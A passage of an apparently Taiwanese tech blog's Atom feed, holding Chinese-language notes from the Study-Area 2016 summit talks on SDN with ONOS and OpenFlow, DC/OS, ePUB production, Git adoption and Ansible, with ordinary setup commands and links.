&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Headphone/M.1468381706.A.46D.html"&gt;Re: [討論] SSD的音質 - 看板 Headphone - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=wZHEVPxhR8c&amp;amp;feature=youtu.be"&gt;【今周刊】圖解新聞：彭淮南如何影響你的荷包？ - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;簡單易懂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tool&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.flash-to-html5.net/"&gt;Free Flash to HTML5 Online Converter&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E8%97%8F%E6%9B%B8%E7%A5%A8"&gt;藏書票 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「藏書票可以說一種小型的版畫，本來是用來貼在書本封面內外，作為自己藏書的標誌，和藏書印一樣。」原來有這種東西呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Luigi"></category><category term="Jkyell"></category><category term="K8s"></category><category term="Go"></category><category term="Joke"></category><category term="Ptt"></category><category term="Tool"></category><category term="Facebook"></category><category term="GAE"></category><category term="Ansible"></category><category term="Linux"></category><category term="Cloudflare"></category><category term="Github"></category><category term="Hitcon"></category><category term="Misc"></category><category term="Markdown"></category><category term="Taiwan"></category><category term="Trivia"></category><category term="Android"></category><category term="Opensource"></category></entry><entry><title>Study-Area 2016 群英會</title><link href="https://blog.m157q.tw/posts/2016/07/16/study-area-summit-2016/" rel="alternate"></link><published>2016-07-16T16:28:58+08:00</published><updated>2016-07-16T16:28:58+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-16:posts/2016/07/16/study-area-summit-2016/</id><summary type="html">&lt;p&gt;Event Link: &lt;a href="http://studyarea.kktix.cc/events/c6457aff"&gt;http://studyarea.kktix.cc/events/c6457aff&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;好多人報了名沒出現啊 ww  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;ONOS 及實際 SDN Switch 整合使用經驗分享 by 小飛機&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;投影片連結：&lt;a href="https://docs.google.com/presentation/d/18tDnGkjTQ1yEcZnNkVz94a0FbusDd9lXb3MAcTnZDzE/edit#slide=id.p"&gt;ONOS 及實際 SDN Switch 使用經驗分享 - Google 簡報&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;ONC (Open Network Conference), SDN 相關領域年度最大聚會  &lt;/li&gt;
&lt;li&gt;因為在 ONC 發表成果，而被 Bell Labs 位於比利時的歐洲總部邀請面試。  &lt;ul&gt;
&lt;li&gt;多參與 Open Source 專案，讓自己在國際級的 Conf 被看見，是很有用的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;SDN 新手如何開始？&lt;/h2&gt;
&lt;h3&gt;簡單起頭&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;只做 L2 Switching  &lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;ping&lt;/code&gt; 驗證網路狀況  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;iperf&lt;/code&gt; 驗證網路速度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;決定 Topology  &lt;ul&gt;
&lt;li&gt;3-Tier Topology  &lt;/li&gt;
&lt;li&gt;Mesh Topology  &lt;/li&gt;
&lt;li&gt;Leaf-Spine Topology  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Spanning_Tree_Protocol#Rapid_Spanning_Tree_Protocol"&gt;STP&lt;/a&gt; (Spannig Tree Protocol)  &lt;ul&gt;
&lt;li&gt;Loop-free Topology  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;養成有實驗組與對照組的習慣  &lt;/li&gt;
&lt;li&gt;基本的 Networking 經驗要有  &lt;/li&gt;
&lt;li&gt;美國有高中生就在當 intern 學習這個部份，所以不要覺得門檻太高，真的有興趣的話就跳下來研究吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;常見實際拓墣&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Internet -- DHCP/NAT Server -- Legacy L2 Switch  -- OpenFlow Controller (放在內網，不然很容易被打）  
                                       |  
                            OpenFlow-Enabled Switch (建議用 Out-of-band)  
                                   /        \  
                             Host A         Host B  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以觀察到封包都是好事  &lt;/p&gt;
&lt;h3&gt;OpenFlow-Enabled Switch 選擇&lt;/h3&gt;
&lt;p&gt;價格從高排到低依序為：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;採買實體 OpenFlow-Enabled Switch 及 Network OS  &lt;ul&gt;
&lt;li&gt;從各家 Network OS 廠商中的 Hardware Compatibility List 裡挑選硬體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux Server + 4-Port NIC + OpenvSwitch  &lt;ul&gt;
&lt;li&gt;可以直接在 Local 用 Wireshark 觀察封包  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 OpenWrt AP + OpenvSwitch  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Protocol 請以 1.3 為主，1.0 為次。  &lt;/p&gt;
&lt;p&gt;OpenvSwitch 和 Docker (Socket Plan), Xen Server 有關  &lt;/p&gt;
&lt;h3&gt;OpenFlow Controller 選擇&lt;/h3&gt;
&lt;p&gt;選擇 Controller Application 有實作 L2 Forwarding 或者是 Switching 功能  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://osrg.github.io/ryu/"&gt;Ryu&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;學習曲線低  &lt;/li&gt;
&lt;li&gt;Keyword: &lt;code&gt;Simple_Switch_13&lt;/code&gt; (or &lt;code&gt;Simple_Switch_10&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://onosproject.org/"&gt;ONOS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;學習曲線偏高  &lt;/li&gt;
&lt;li&gt;Keyword: &lt;code&gt;org.onosproject.fwd&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tip: 觀測不同家的 Controller 建立行為基準  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;直接接上 SDN Controller 進行測試？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果你經驗非常豐富的話，可以。  &lt;/li&gt;
&lt;li&gt;要先確保 OpenFlow-Enabled Switch, Host A, Host B 都可以 ping 到 OpenFlow Controller  &lt;ul&gt;
&lt;li&gt;八成的人有問題都是出在這部份，基本上就是網路設定沒設定好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;OpenFlow Connection Setup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://sdnhub.org/tutorials/openflow-1-3/"&gt;http://sdnhub.org/tutorials/openflow-1-3/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;要記得看 Spec，去對照現在做的行為對不對  &lt;/li&gt;
&lt;li&gt;確認連線正常後，再開啟 OpenFlow Controller。（SDN 的功能）  &lt;/li&gt;
&lt;li&gt;到目前為止是基本的設定步驟，可以嘗試用全自動化的方式做掉這部份，例如用 Ansible。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在啟動 SDN 的狀況下，連線不正常？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;觀測 Flow Count 是否有增加 =&amp;gt; 可確定 Flow Entry 有沒有被 Match  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ovs-ofctl dump-flows&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tips: 先從 Switch 開始懷疑起  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;真的找不出業障在哪裡的話&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;撈封包回來用 Wireshark 檢查  &lt;/li&gt;
&lt;li&gt;根據 IANA 的規定，OpenFlow 使用 6653 port，但早期有些是 6633 port，記得現在都用 6653 就好。  &lt;/li&gt;
&lt;li&gt;業障關鍵字： &lt;code&gt;OFPT_ERROR&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;對照 &lt;a href="https://www.opennetworking.org/images/stories/downloads/sdn-resources/onf-specifications/openflow/openflow-spec-v1.3.0.pdf"&gt;OpenFlow 1.3 Spec Error Message&lt;/a&gt; (A.4.4) 確定錯誤碼的意思  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;複雜一點的實際使用案例&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ONOS SDN-IP  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.onosproject.org/display/ONOS/SDN-IP+Tutorial"&gt;https://wiki.onosproject.org/display/ONOS/SDN-IP+Tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://opencord.org/"&gt;OpenCORD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;AT&amp;amp;T 提出的 Project  &lt;/li&gt;
&lt;li&gt;Re-architecting the Central Office  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://opencord.org/wp-content/uploads/2016/04/ONS-2016-Plenary.pdf"&gt;http://opencord.org/wp-content/uploads/2016/04/ONS-2016-Plenary.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;今年 4 月在美國有進行 field try 了  &lt;/li&gt;
&lt;li&gt;Domains (三者都建立在 CORD Controller）  &lt;ul&gt;
&lt;li&gt;Residential  &lt;/li&gt;
&lt;li&gt;Mobile  &lt;/li&gt;
&lt;li&gt;Enterprise  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ONF Atrium - SDN Project Stack  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.opennetworking.org/?p=1757&amp;amp;option=com_wordpress&amp;amp;Itemid=316"&gt;https://www.opennetworking.org/?p=1757&amp;amp;option=com_wordpress&amp;amp;Itemid=316&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/onfsdn/atrium-docs"&gt;https://github.com/onfsdn/atrium-docs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;對這些專案或者和 SDN 相關議題有興趣的話，歡迎加入 &lt;a href="http://sdnds.tw/"&gt;SDNDS-TW 社群&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/opennetworkinglab/onos"&gt;GitHub - opennetworkinglab/onos: Open Network Operating System&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;淺談 DC/OS by Daniel&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;相關關鍵字  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://dcos.io/"&gt;DC/OS&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://mesos.apache.org/"&gt;Mesos&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://kubernetes.io/"&gt;Kubernets&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://coreos.com/"&gt;CoreOS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What's DC/OS&lt;/h2&gt;
&lt;h3&gt;Mesos Master Quorum&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;預設一台 Mesos Master，兩台 Mesos Standby，預設用 ZooKeeper 管理。  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Framework 和 Scheduler 做資源的分配與調度，丟到 Mesos Slave (Framework + Executor) 執行  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://docs.mesosphere.com/1.7/overview/architecture/"&gt;Architecture - Mesosphere DC/OS Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DCOS Master  &lt;ul&gt;
&lt;li&gt;Mesos DNS  &lt;ul&gt;
&lt;li&gt;Service Discovery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DCOS Private Agent  &lt;ul&gt;
&lt;li&gt;給內部使用，外網連不到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DCOS Public Agent  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why DC/OS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;生態圈豐富  &lt;ul&gt;
&lt;li&gt;許多大廠都有在使用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;漂亮的 GUI  &lt;/li&gt;
&lt;li&gt;有 HA 機制 (ZooKeeper) 及 Service Discovery (Mesos DNS)  &lt;/li&gt;
&lt;li&gt;100% Open Source  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to use DC/OS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dcos.io/docs/1.7/"&gt;https://dcos.io/docs/1.7/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Use DC/OS on AWS  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://mesosphere.com/amazon/"&gt;https://mesosphere.com/amazon/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Login 方式目前只支援三種  &lt;ul&gt;
&lt;li&gt;Google Gmail  &lt;/li&gt;
&lt;li&gt;Azure Hotmail  &lt;/li&gt;
&lt;li&gt;GitHub  &lt;/li&gt;
&lt;li&gt;LDAP 是不行的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://github.com/mhausenblas/dploy"&gt;dploy&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;DC/OS 的 build file 是 JSON 格式，和 Dockerfile 的 yaml 格式不同。  &lt;/li&gt;
&lt;li&gt;Usage  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;dploy init&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy dryrun&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy destory&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;刪除 container  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy ls&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;列出所有 containers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy [-all] ps&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;列出 container 在執行的 process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dploy -pid=&amp;lt;PID&amp;gt; [-instances=NUM] scale&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;幫你做 auto-scaling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Docs  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dploy.sh"&gt;http://dploy.sh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mhausenblas/s4d"&gt;GitHub - mhausenblas/s4d: A sandbox for dploy (s4d)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;透過 GitHub 的 Webhook 去 trigger DC/OS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://docs.mesosphere.com/1.7/usage/service-guides/marathon/"&gt;Marathon&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;DC/OS GUI 介面  &lt;/li&gt;
&lt;li&gt;有基本的 healthcheck  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dcos/dcos"&gt;GitHub - dcos/dcos: DC/OS Build and Release tools&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://mesosphere.com/google/"&gt;Mesosphere DCOS on Google Cloud Platform - Mesosphere&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://techcrunch.com/2014/08/18/mesosphere-comes-to-the-google-cloud-platform-integrates-googles-kubernetes-project/"&gt;Mesosphere Comes To Google's Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://open.mesosphere.com/getting-started/install/"&gt;Setting up a Mesos and Marathon Cluster · Mesosphere&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/cadvisor"&gt;GitHub - google/cadvisor: Analyzes resource usage and performance characteristics of running containers.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;ePUB 電子書現場包 by 雨蒼&lt;/h1&gt;
&lt;h2&gt;為什麼要用 ePUB&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reflow  &lt;ul&gt;
&lt;li&gt;中文直排  &lt;/li&gt;
&lt;li&gt;避頭尾點  &lt;/li&gt;
&lt;li&gt;嵌入字體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援字體特效  &lt;/li&gt;
&lt;li&gt;Fixed Layout  &lt;ul&gt;
&lt;li&gt;一頁一圖  &lt;ul&gt;
&lt;li&gt;日本蠻多拿來做漫畫的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有聲朗讀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提供 DRM 版權保護  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ePUB 的結構&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;mimetype  &lt;/li&gt;
&lt;li&gt;META-INF/container.xml  &lt;ul&gt;
&lt;li&gt;設定路徑  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OEBPS/content.opf  &lt;ul&gt;
&lt;li&gt;整個 ePUB 最核心的地方  &lt;/li&gt;
&lt;li&gt;metadata  &lt;/li&gt;
&lt;li&gt;manifest  &lt;ul&gt;
&lt;li&gt;可放字體、圖片、CSS、XML，基本上就是個網頁  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;spine  &lt;ul&gt;
&lt;li&gt;整個 ePUB 的骨幹。（目錄、書本內容）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;guide  &lt;ul&gt;
&lt;li&gt;導讀頁  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;打包流程&lt;/h2&gt;
&lt;p&gt;製作 Markdown =&amp;gt; &lt;a href="http://conv.denshochan.com/tw"&gt;電電轉換器&lt;/a&gt; =&amp;gt; 解壓縮、修改、打包  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://conv.denshochan.com/tw/markdown"&gt;電電轉換器有自己的特殊 Markdown format&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;表格  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.convertcsv.com/csv-to-html.htm"&gt;csv to html converter&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;再貼上到 Markdown 裏面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://conv.denshochan.com/tw/config"&gt;電電設定檔&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;使用 YAML 格式  &lt;/li&gt;
&lt;li&gt;ddconv.yml  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;上傳打包  &lt;/li&gt;
&lt;li&gt;修改檔案  &lt;ul&gt;
&lt;li&gt;使用 ePUB Packer 解壓縮  &lt;/li&gt;
&lt;li&gt;使用 ePUB Checker 檢查語法是否有錯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;修改 CSS  &lt;ul&gt;
&lt;li&gt;新增靠右對齊  &lt;/li&gt;
&lt;li&gt;blockquote 從變成斜體修改成變成標楷體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;實際打包&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;從 gitbook 到 ePUB  &lt;ul&gt;
&lt;li&gt;toc.ncx 很不好改，而且在 ePUB 不是必要的，所以可以直接砍掉  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;目前遇的問題&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ePUB 的表格呈現不是很理想  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Q&amp;amp;A&lt;/h2&gt;
&lt;p&gt;Q: 自己做電子書要如何申請 ISBN?&lt;br /&gt;
A: 我都交給別人申請，有需要的話可以找我，我幫你轉介給知道的人幫忙。  &lt;/p&gt;
&lt;p&gt;電電轉換器是日本人開發的，&lt;br /&gt;
目前還有些不足的地方，&lt;br /&gt;
有時候會突然當掉。  &lt;/p&gt;
&lt;p&gt;Q: 臺灣有沒有類似 &lt;a href="https://www.bookscan.co.jp"&gt;https://www.bookscan.co.jp&lt;/a&gt; 這種讓你寄實體書過去然後轉成電子書給你的服務？&lt;br /&gt;
A: 臺灣目前好像沒有。  &lt;/p&gt;
&lt;p&gt;Q: GitBook vs ePUB&lt;br /&gt;
A: 一開始也是用 GitBook，但後來用電電轉換器這套以後，覺得這套方法比較好，因為這套方法產生出來的 ePUB 才能上架到 Google 等其他平台。但我通常還是會兩個都做，先弄 GitBook 的版本，然後再把 GitBook 產生的 markdown 全部合到一個 markdown 裡頭再用這套方法產生 ePUB。  &lt;/p&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://g0v.hackpad.com/epub3-9zQsGYYU1TG"&gt;如何製作一本epub3電子書 - g0v.hackpad.com&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gitbook.com/book/jrf-tw/citizen_defend_rights_99_steps/details"&gt;小市民權益保護99招  - GitBook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://jrf-tw.gitbooks.io/citizen_defend_rights_99_steps/content/"&gt;Introduction · 小市民權益保護99招&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/EPUB"&gt;EPUB - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Git 導入中小企業經驗分享 by Haway&lt;/h1&gt;
&lt;h2&gt;真實遇到的問題&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Clone 錯專案  &lt;/li&gt;
&lt;li&gt;Add 錯檔案，不能 commit  &lt;/li&gt;
&lt;li&gt;Merge 失敗  &lt;/li&gt;
&lt;li&gt;Branch 是三小  &lt;/li&gt;
&lt;li&gt;不會打版號  &lt;/li&gt;
&lt;li&gt;SVN 的高手搗亂  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;版本號如何決定&lt;/h2&gt;
&lt;p&gt;就 &lt;a href="http://semver.org/"&gt;Semantic Versioning 2.0.0&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Git 專案開始&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;與開發人員討論工作習慣  &lt;/li&gt;
&lt;li&gt;瞭解開發環境與測試方式  &lt;/li&gt;
&lt;li&gt;專案賣給 A 客戶後，也要賣給 B 客戶，但要微調需求，這時候要開新 branch 還是 clone 成新 project 來改？  &lt;ul&gt;
&lt;li&gt;clone 成新 project 來改，因為開新的 branch 的話，永遠不會 merge，開一個不會 merge 的 branch 幹嘛？  &lt;blockquote&gt;
&lt;p&gt;其實我沒有很認同這個，萬一要是要更改什麼功能或是修改 bug 呢？每個 repo 都要重覆改？跨 repo 的 cherry-pick？要是今天有 N 間公司呢？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在一個 git repo 底下，什麼時候該用 &lt;code&gt;git init&lt;/code&gt;？什麼時候該用 &lt;code&gt;git submodule&lt;/code&gt;？  &lt;ul&gt;
&lt;li&gt;可以自己獨立運作的就 &lt;code&gt;git init&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;必須 depend 在現在這個 git repo 底下的就 &lt;code&gt;git submodule&lt;/code&gt;  &lt;blockquote&gt;
&lt;p&gt;我也沒有很認同這個答案，基本上 submodule 對我來說就是有用到 git 的 dependency packages 就可以用。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;大部分都是喇賽性質，&lt;br /&gt;
覺得這個 Talk 應該叫做 「大家一起來嘲笑 git 新手會做的那些蠢事」，&lt;br /&gt;
本來是預期這個 talk 應該會講遇到的困難，&lt;br /&gt;
然後怎麼設計出一個使用模式或者解法，&lt;br /&gt;
讓不太會使用 git 的人也能夠開發。&lt;br /&gt;
或者是怎樣的教學可以讓這些新手比較快瞭解 git 的概念，&lt;br /&gt;
而不是只是提到遇到的問題然後一直抱怨，&lt;br /&gt;
這個在 Twitter 上嘴炮就好了啊，&lt;br /&gt;
沒必要開個 talk 吧 XD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;淺談 Ansible 組態管理工具 by Sakana&lt;/h1&gt;
&lt;p&gt;這個應該跟我半年前聽的那場內容是一樣的，&lt;br /&gt;
&lt;a href="/posts/2015/12/26/study-area-ansible-tutorial-note/"&gt;2015 12 月份 SA@Tainan 淺談 Ansible 自動化組態管理工具之筆記&lt;/a&gt;&lt;br /&gt;
這次有補充的內容我會集中整理在這份裡頭，不會記這在篇。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;現代 IT 人一定要知道的 Ansible 自動化組態技巧 by 凍仁翔&lt;/h1&gt;
&lt;h2&gt;Roles 是什麼？&lt;/h2&gt;
&lt;p&gt;"Scalinig Up Your Playbooks" - Ansbile: Up and Running  &lt;/p&gt;
&lt;h2&gt;怎麼使用 Roles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://galaxy.ansible.com"&gt;https://galaxy.ansible.com&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;安裝 Roles  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ ansible-galaxy install {ansible-roles}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;初始化  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ ansible-galaxy init {ansible-roles}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://galaxy.ansible.com/intro"&gt;https://galaxy.ansible.com/intro&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Windows Support 是什麼？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.ansible.com/ansible/intro_windows.html"&gt;https://docs.ansible.com/ansible/intro_windows.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Ansible 2.0 對 Windows Managed node 的支援度大幅提升  &lt;ul&gt;
&lt;li&gt;換句話說，就是 2.0 以前的支援度蠻雷的 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過 inventory 定義 Managed node 透過 WinRM, SSH, PowerShell 來佈署  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;怎麼用 Ansible 管 Windows Server？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;怎麼佈署 Control Node?  &lt;ul&gt;
&lt;li&gt;安裝 Ansible 和 pywinrm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;怎麼佈署 Managed Node?  &lt;ul&gt;
